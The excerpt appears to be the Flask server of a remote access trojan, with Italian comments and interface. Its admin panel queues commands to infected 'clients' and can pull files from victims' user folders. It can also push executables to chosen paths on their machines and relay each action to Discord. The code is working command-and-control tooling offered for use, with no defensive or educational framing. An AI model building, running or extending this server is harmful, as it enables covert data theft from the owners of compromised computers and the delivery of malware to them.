...
def cleanup_old_files():
    try:
        ...
        # Pulisci file temporanei download
...
def admin_panel():
    ...
    # Raccogli tutti gli utenti unici
    ...
    .tab-button {{ padding: 10px 20px; background: #6c757d; color: white; border: none; border-radius: 5px 5px 0 0; cursor: pointer; }}
    ...
    <div class="tab-buttons">
        <button class="tab-button active" onclick="switchTab('commands')">📋 Comandi</button>
        <button class="tab-button" onclick="switchTab('files')">📁 File Transfer</button>
        <button class="tab-button" onclick="switchTab('clients')">👥 Client</button>
    </div>
    ...
    <div id="files-tab" class="tab-content">
        <div class="section">
        <h3>📥 Download File (Nuovo Sistema)</h3>
        <form action="/api/prepare_download" method="post">
        <label>Client:</label><br>
        <select name="client_id">
        {clients_options}
        </select><br><br>
        ...
        <input type="text" name="filepath" placeholder="C:\\Users\\{{user}}\\Desktop\\file.txt"><br>
        <small>Sostituisci {{user}} con il nome utente target</small><br><br>
        
        <button type="submit">Prepara Download</button>
        </form>
        </div>
        
        <div class="section">
        <h3>📤 Upload File (Nuovo Sistema)</h3>
        <form action="/api/prepare_upload_http" method="post">
        <label>Client:</label><br>
        <select name="client_id">
        {clients_options}
        </select><br><br>
        ...
        <input type="text" name="server_path" placeholder="uploads/nome_file.exe"><br>
        <small>File deve essere nella cartella 'uploads' del server</small><br><br>
        
        <label>Destinazione sul client:</label><br>
        <input type="text" name="client_path" placeholder="C:\\Users\\{{user}}\\Desktop\\file.exe"><br><br>
        
        <button type="submit">Prepara Upload HTTP</button>
        </form>
        </div>
    </div>
...
def remove_client_endpoint():
    ...
    try:
        ...
        <p>Client <code>{client_id}</code> è stato rimosso dal sistema.</p>
...
def send_command():
    try:
        ...
        if target_user != "SYSTEM":
            # Aggiungi prefisso per identificare l'utente target
            final_command = f"user_{target_user}:{command}"
            
            # Per comandi specifici che richiedono sostituzione {user}
            if command in ["list_files", "download_file"]:
                pass  # La sostituzione sarà fatta nel client
            elif command.startswith("download_file:"):
                # Gestisci già qui la sostituzione per download
                filepath = command[len("download_file:"):]
                if "{user}" in filepath:
                    filepath = filepath.replace("{user}", target_user)
                final_command = f"user_{target_user}:download_file:{filepath}"
...
# ============================================
# 📁 NUOVI ENDPOINTS FILE TRANSFER HTTP
# ============================================

@app.route('/api/prepare_download', methods=['POST'])
def prepare_download():
    """Prepara download file dal client"""
    try:
        client_id = request.form.get('client_id')
        ...
        # Costruisci comando per il client
        command = f"upload_file_http:{filepath}"
        if target_user != "SYSTEM":
            command = f"user_{target_user}:{command}"
        
        client_manager.add_command(client_id, command)
        
        send_to_discord(f"📥 Download preparato per `{client_id}`" +
                       (f" (utente: {target_user})" if target_user != "SYSTEM" else "") +
                       f": {filepath}")
        
        return f'''
        <h3>✅ Download Preparato!</h3>
        <p><strong>Client:</strong> <code>{client_id}</code></p>
        <p><strong>File:</strong> <code>{filepath}</code></p>
        <p><strong>Utente Target:</strong> {target_user if target_user != "SYSTEM" else "SYSTEM (tutti)"}</p>
        <p>Il client invierà il file al server quando sarà in linea.</p>
        <p><a href="/admin">↶ Torna al Panel</a></p>
        '''
...
@app.route('/api/prepare_upload_http', methods=['POST'])
def prepare_upload_http():
    """Prepara upload file al client via HTTP"""
    try:
        client_id = request.form.get('client_id')
        ...
        if not os.path.exists(server_path):
            # Prova nella cartella uploads
            server_path = os.path.join(UPLOAD_FOLDER, server_path)
            if not os.path.exists(server_path):
        ...
        # Copia file in downloads con nuovo nome
        download_path = os.path.join(DOWNLOAD_FOLDER, f"{file_id}_{filename}")
        shutil.copy2(server_path, download_path)
        
        # Costruisci comando per il client
        download_url = f"{request.host_url.rstrip('/')}/api/file_download/{file_id}_{filename}"
        command = f"download_http:{download_url}:{client_path}"
        ...
        send_to_discord(f"📤 Upload preparato per `{client_id}`" +
                       (f" (utente: {target_user})" if target_user != "SYSTEM" else "") +
                       f": {filename} → {client_path} ({file_size/1024:.1f} KB)")
        
        return f'''
        <h3>✅ Upload Preparato!</h3>
        <p><strong>Client:</strong> <code>{client_id}</code></p>
        <p><strong>File:</strong> <code>{filename}</code> ({file_size/1024:.1f} KB)</p>
...
def handle_file_upload():
    """Riceve file dal client via HTTP multipart"""
    try:
        ...
        original_path = request.form.get('original_path', 'unknown')
        ...
        filename = f"{client_id}_{timestamp}_{safe_filename}"
        ...
        send_to_discord(f"📤 File ricevuto da `{client_id}`: {file.filename} ({os.path.getsize(filepath)/1024:.1f} KB)")
...
@app.route('/api/file_download/<path:filename>')
def download_file(filename):
    """Serve file al client via HTTP"""
    try:
...
if __name__ == '__main__':
    # Import aggiuntivo per copia file
    import shutil
